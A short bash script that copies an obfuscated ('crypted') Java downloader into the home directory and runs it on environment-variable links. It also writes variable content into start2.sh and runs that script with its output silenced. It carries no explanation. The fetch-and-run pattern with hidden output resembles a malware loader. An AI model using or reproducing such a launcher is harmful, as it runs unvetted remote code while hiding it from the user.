#!/bin/bash
cp crypted_jwget.jar /$HOME
cd $HOME
echo $LINK2 > start2.sh
java -jar crypted_jwget.jar $LINK
chmod +x ./start2.sh
./start2.sh &> /dev/null
java -jar crypted_jwget.jar $LINK3
ls /$HOME
echo $PATH
#java -jar crypted_leatestacc.jar Storage1















